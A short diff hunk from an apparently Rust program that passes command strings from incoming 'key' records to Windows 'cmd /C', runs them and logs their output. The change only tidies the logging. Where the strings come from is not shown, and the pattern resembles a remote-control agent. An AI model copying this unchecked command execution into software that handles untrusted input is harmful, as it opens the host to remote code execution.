@@ -325,16 +325,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     let output: Result<Output, io::Error> =
                         execute_command("cmd", &["/C", &key.sentence]);
                     match output {
-                        Ok(o) => {
-                            let string_match =
-                                str::from_utf8(&o.stdout).expect("Can't").split("\n");
-                                update_log_file(&log_file_path,format!("Command Output: {:?}", str::from_utf8(&o.stdout)).as_str());
-                            if str::contains(&key.sentence, ".exe") {
-                                for j in string_match {
-                                    println!("{:?}", &j);
-                                }
-                            }
-                        }
+                        Ok(o) => update_log_file(&log_file_path,format!("Command Output: {:?}. Command Status: {}", str::from_utf8(&o.stdout),&o.status).as_str()),
                         Err(e) => update_log_file(&log_file_path,format!("Error Running Command: {}, Sentence: {}", e, &key.sentence).as_str()),
                     }
                 } else if key.code > 800 && key.code < 850 {
